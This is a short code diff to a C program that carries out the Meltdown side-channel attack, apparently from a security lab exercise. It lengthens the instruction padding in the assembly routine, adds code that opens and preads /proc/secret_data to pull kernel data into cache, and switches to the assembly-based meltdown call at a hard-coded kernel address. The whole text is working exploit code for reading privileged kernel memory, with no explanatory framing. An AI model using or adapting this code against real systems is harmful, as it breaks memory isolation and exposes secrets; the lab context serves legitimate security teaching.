@@ -55,7 +55,7 @@ void meltdown_asm(unsigned long kernel_data_addr) {
 
   // Give eax register something to do
   asm volatile(
-      ".rept 400;"
+      ".rept 1200;"
       "add $0x141, %%eax;"
       ".endr;"
 
@@ -79,8 +79,16 @@ int main() {
   // FLUSH the probing array
   flushSideChannel();
 
+  // Open the /proc/secret_data virtual file
+  int fd = open("/proc/secret_data", O_RDONLY);
+  if (fd < 0) {
+    perror("open");
+    return -1;
+  }
+  int ret = pread(fd, NULL, 0, 0);
+
   if (sigsetjmp(jbuf, 1) == 0) {
-    meltdown(0xfb61b000);
+    meltdown_asm(0xfb61b000);
   } else {
     printf("Memory access violation!\n");
   }
